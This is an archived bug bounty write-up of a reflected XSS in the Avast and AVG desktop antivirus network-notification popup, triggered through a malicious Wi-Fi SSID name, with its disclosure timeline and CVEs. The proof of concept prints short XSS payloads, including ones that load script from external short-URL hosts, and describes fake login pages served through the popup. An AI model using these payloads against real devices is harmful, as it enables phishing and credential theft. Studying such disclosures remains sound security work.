---
source: imported
source_type: markdown
original_path: knowledge-inbox/blogs-incoming/2019-10-29_5000-usd-xss-issue-at-avast-desktop-antivirus-for-windows-yes-desktop.md
original_filename: 2019-10-29_5000-usd-xss-issue-at-avast-desktop-antivirus-for-windows-yes-desktop.md
title: 5,000 USD XSS Issue at Avast Desktop AntiVirus for Windows (Yes, Desktop!)
category: documents
detected_topics:
- xss
- command-injection
- automation-abuse
- mobile-security
tags:
- imported
- documents
- xss
- command-injection
- automation-abuse
- mobile-security
language: en
raw_sha256: dd4693e1c6263b8d5a6b033e4d898e2647506fcaa75ec2c74a6bebb43a7159fa
text_sha256: 8013f60117fa301476c7552daa3a33ce372be79a700fbd5f38d18fa9973fd331
ingested_at: '2026-06-28T07:32:00Z'
sensitivity: unknown
redactions_applied: false
---

# 5,000 USD XSS Issue at Avast Desktop AntiVirus for Windows (Yes, Desktop!)

## Source Metadata

- Original Path: knowledge-inbox/blogs-incoming/2019-10-29_5000-usd-xss-issue-at-avast-desktop-antivirus-for-windows-yes-desktop.md
- Source Type: markdown
- Detected Topics: xss, command-injection, automation-abuse, mobile-security
- Ingested At: 2026-06-28T07:32:00Z
- Redactions Applied: False
- Raw SHA256: `dd4693e1c6263b8d5a6b033e4d898e2647506fcaa75ec2c74a6bebb43a7159fa`
- Text SHA256: `8013f60117fa301476c7552daa3a33ce372be79a700fbd5f38d18fa9973fd331`


## Content

---
title: "5,000 USD XSS Issue at Avast Desktop AntiVirus for Windows (Yes, Desktop!)"
url: "https://medium.com/bugbountywriteup/5-000-usd-xss-issue-at-avast-desktop-antivirus-for-windows-yes-desktop-1e99375f0968"
authors: ["YoKo Kho (@YokoAcc)"]
programs: ["Avast"]
bugs: ["Reflected XSS"]
bounty: "5,000"
publication_date: "2019-10-29"
added_date: "2022-09-15"
source: "pentester.land/writeups.json"
original_index: 4965
scraped_via: "browseros"
---

# 5,000 USD XSS Issue at Avast Desktop AntiVirus for Windows (Yes, Desktop!)

5,000 USD XSS Issue at Avast Desktop AntiVirus for Windows (Yes, Desktop!)
CVE-2019–18653 & CVE-2019–18654: The story when Reflected XSS was triggered from the SSID Name (It also affected AVG AntiVirus because basically the product codes were mostly “merged”).
YoKo Kho
Follow
9 min read
·
Oct 29, 2019

426

1

بسم الله الرحمن الرحيم

So, this article will be explained in two ways, which are the one that tells how I got it and the one that tries to explain the basic and reference.
Readers could also read the TL;DR section directly.
I. TL;DR

1.1. Create an SSID Name with a simple XSS Payload (with maximum = 32 characters). We can use BruteLogic and s0md3v short XSS payload (thanks man!).

1.2. Connect your Windows OS (with Avast AntiVirus installed and active) to the SSID and wait for the Avast Network Notification Feature to trigger the XSS payload.

Press enter or click to view image in full size
Triggering the XSS via SSID Name

1.3. Report it to Avast and confirmed as a valid issue in about 2 days. And a few months later, they judged whether the issue was rather serious and decided to reward the report with $5000.

II. Behind the Scene about How I got this Issue

A few years ago, I read a good article from one of the bug hunters when he just got a lot of XSS issues in some big companies by putting XSS payload on his SSID name (I really lost the bookmark for one reason). In short, when he surfs to many applications, he gets many applications that reflect the value of his SSID name (and XSS is triggered). From there, then I started using XSS payload as my SSID name (on OS X).

So, a few months ago, I got a notebook (with windows in it) from the office where I was working at that time. I installed everything I needed from the tethering connection and left Avast AntiVirus for the last (at home). At home, I continued the installation and everything went well.

Until one day I use this notebook again for training purposes. In the middle of training (day 3 or day 4), In the middle of training (day 3 or day 4), I had a problem with the used connection. So, suddenly this notebook connects to my tethering connection automatically (with Avast already installed), and within seconds, I get a pop-up warning with “https://local.avast.com” appearing on my desktop.

To be honest, I don’t know how it works. Lucky for me, there was a video recording in class and I asked to copy a conversation between this time period. Trying to find out how that happened, I finally got an answer the next day. That XSS is triggered because the embedded “Network Notification Feature” (Firewall) in Avast (specifically for Internet Security and Premiere Edition) reflects the SSID name and has not been sanitized yet.

Then I made a report that night, and got a reply about 2 days confirming whether the issue was valid.

III. Abstract

As quoted from Avast’s official site, Avast as one of the largest security companies in the world that using next-gen technologies to fight cyber-attacks in real time, is dedicated to creating a world that provides safety and privacy for all, no matter who you are, where you are, or how you connect.

With so much research done by Avast, Avast tries to achieve the best endpoint protection for every user. One feature that has been embedded is the “Firewall” feature that can be used easily to manage incoming and outgoing traffic.

By default, this Firewall feature can give users a warning (pop-up notification) when they are connected to a new network. For example, like the image shown below, this shows that the user has just connected to a wireless network with “My Hotspot” as the SSID name.

Press enter or click to view image in full size
Popup Notification when Connected to new Network

After the popup appears, the user can choose the type of network from the SSID they are connecting to, such as a “Private” network or a “Public” network.

However, a problem arises when this notification popup does’t filter out special characters that are reflected from the SSID name. In other words, an attacker can trigger XSS on a client through “popup notifications” by using the malicious SSID name.

IV. Introduction

4.1. Cross Site Scripting (XSS)
To put it simply, this kind of vulnerability is a vulnerability that could “let” an Attacker to be able to execute a code in the input section that hasn’t implemented filtering for special characters such as “ > < : / ; etc. In contrast to Stored XSS that “saves” the executed code, Reflected XSS actually doesn’t save this script at all, so the “target” is expected and required to visit the URL that has been “injected” by additional contents from an Attacker.

In this situation, Avast has reflected the input (from the SSID Name) into the popup notification (each time the user changes the connection). When the SSID name contains client-side scripts (such as javascript), notifications will trigger scripts that can trigger XSS vulnerabilities.

One good thing, even the SSID name has a limit of around 32 characters, we can still cut it off by calling a short URL. Credits to Brute Logic and S0md3v, Thanks man!

4.1.1. The Short XSS Payload
The first time I got a popup warning, I didn’t know how to trigger it further. Then Alhamdulillah, I was very lucky because I remembered reading a publication made by “Brute Logic” and “S0md3v” related the short XSS Payload. And the cool thing is, it works!

If you are looking for great and creative XSS payloads, then I recommend both of these researches:
• https://brutelogic.com.br/blog/shortest-reflected-xss-possible/
• https://github.com/s0md3v/AwesomeXSS

And yes (of course), there are plenty of researchers out there who still share other great and creative payload that you can follow.

4.2. Research Story related things that could be Executed by using the Malicious SSID Name
As explained earlier, I realized this trick from writing released by one of the bug hunters (I’m very sorry, I really lost my bookmark because of one thing). From his research, I finally learned that research in this field was carried out in great detail in the 2013 by Deral Heiland. He has published the research at BlackHat Europe 2013.

So, for research and in-depth knowledge about this, you can refer to his presentation. Very recommended.

4.3. Affected Version and Testing Environment
Avast: The affected version of this vulnerability could be found at Avast Internet Security version 19.3.2369 (build 19.3.4241.440). It also affects the Avast Free Antivirus the premiere one.

And from the AVG side: the issue was affects the AVG Internet Security version 19.3.3084 (build 19.3.4241.440).

As a little note, both of issue has been reproduced at the Windows 10 environment (latest patch — per March 22nd, 2019).

V. Summary of Issue

As explained earlier, the security problem in this report is a vulnerability that can allow an Attacker to trigger XSS on the client through “popup notifications” using the malicious SSID name.

In this situation, the Attacker can also display a fake login page (for example with the Avast / AVG logo) via “popup notifications” and the user will not feel suspicious because there is no URL that can be seen / detected when the script triggers a fake login page.

Press enter or click to view image in full size
Sample Case to Triggering the Fake Login Page - Avast
Press enter or click to view image in full size
Sample Case to Triggering the Fake Login Page - AVG
VI. Proof of Concept

To complete the explanation, there are few things that must be done to reproduce this issue. Here are the steps that need to be prepared:

Get YoKo Kho’s stories in your inbox

Join Medium for free to get updates from this writer.

Subscribe

Remember me for faster sign in

6.1. Create SSID with simple JavaScript as the name of the SSID. For example: ><img src=x onerror=prompt(1)>
The basic purpose of using this script is to trigger a popup warning with “1” as a character.

6.2. Make sure if the victim is connected to the SSID that was prepared;

6.3. After the victim is connected to the SSID that is prepared, then wait a few seconds. A pop-up notification will be displayed, and the script will be triggered:

Press enter or click to view image in full size
The Script has been Triggered via Notification Popup - Avast
Press enter or click to view image in full size
The Script has been Triggered via Notification Popup - AVG

6.4. Because the SSID name is limited to 32 characters, we must trick the script by using the short URL service. For example, we try to trigger login forms from other portals.. The used script is: ><embed src=//tiny.cc/XYZABCX> (you also could use bit.ly).

Press enter or click to view image in full size
Triggering the Login Form from other Portal to Notification Popup
Press enter or click to view image in full size
Triggering the Login Form from other Portal to Notification Popup II

And the good thing is, you can also trigger scripts from other external URLs (credits to s0md3v). Here is an example: ><embed src=//14.rs>

Press enter or click to view image in full size
Triggering the script by Using the External Script
VII. Additional Information

To complete the explanation, here is a simple PoC video that can be seen about this:

PoC Video - Triggering the XSS Payload via SSID Name
VIII. Reporting Timeline
Mar 21st, 2019: Found the issue and don’t know the root cause yet;
Mar 22nd, 2019: Found the problem, then create and send the report via bugs@avast.com;
Mar 25th, 2019: Send the information if AVG is affected too;
Mar 25th, 2019: Avast replied and confirmed the bug. They said if they will release a fix soon;
Mar 25th, 2019: Avast replied if that not surprising (if AVG was affect with the same issue). They give a high level explanation nicely.
May 24th, 2019: Avast said if the issue was fixed (in Avast 19.4) and already release. They also said if they will give more details when the reward is decided.
June 12th, 2019: Avast judged this issue to be rather serious and decided to reward the report with $5000. (Really amazing).
Press enter or click to view image in full size
Reward Decision from Avast

This one really broke the record I had in one reward payment. Also, that decision really surprised me. At that time, I still didn’t believe until the numbers actually came into my Paypal account.

For Avast: Thank you very much for the surprising reward and amazing program! Greatly appreciated. I have lost my words to thanking them.

Oct 30th, 2019: CVE-2019–18653 has been assigned for issue at Avast and CVE-2019–18654 has been assigned for issue at AVG.
IX. The Closing

Well, as can be seen by the reader, this is something I never imagined (triggering XSS on the Desktop App). Some simple notes that I might be able to share (with my limited knowledge) are:

Always try to bookmark everything you read. Put notes and comeback when you want to use those tricks for your target. In this case, one day I read and saved a publication made by Brute Logic and s0md3v. When I meet a difficult situation (for example triggering XSS with limited characters), I return to their write-up and open my notes.
Even though it looks silly, it would be better if you enter your SSID name with (for example) Payload XSS. I have placed it for several years (since the first time I read the article published by a bug hunter out there, thank you!), But I found it was triggered in 2019 on Desktop Applications on Windows OS (does’t affect the OS X version of Avast).

Also, another vector that I learned from this is:

XSS through malicious SSID Names can also be triggered for the one that reflecting or storing our SSID name at the App. In this case, Avast and AVG has reflecting the SSID Name.
Apart from the desktop one, just please kindly don’t forget about the XSS that could also be triggered by Web or Mobile Application that reflecting the SSID Name.
At the other side, I also have learnt if the one that stored the SSID Name could also be vulnerable. At least, I have saw it at few write-ups such as:
• [CVE-2019–11877] Credentials Stealing Through XSS on Pix-Link Repeater
• [CVE-2017–14219] XSS in Intelbras Router WRN 240 — Getting Wireless Password and Administrator Session Without Being Connected on the Same Network
• [CVE-2018–17337] XSS via SSID at N.Plug Wireless Repeater version 1.0.0.14
X. Credits
https://media.blackhat.com/eu-13/briefings/Heiland/bh-eu-13-practical-exploitation-heiland-slides.pdf
https://blog.rapid7.com/2016/03/09/its-all-in-the-name/ (also written by Deral Heiland)
https://brutelogic.com.br/blog/shortest-reflected-xss-possible/
https://github.com/s0md3v/AwesomeXSS

Follow Infosec Write-ups for more such awesome write-ups.

InfoSec Write-ups
A collection of write-ups from the best hackers in the world on topics ranging from bug bounties and CTFs to vulnhub…

medium.com
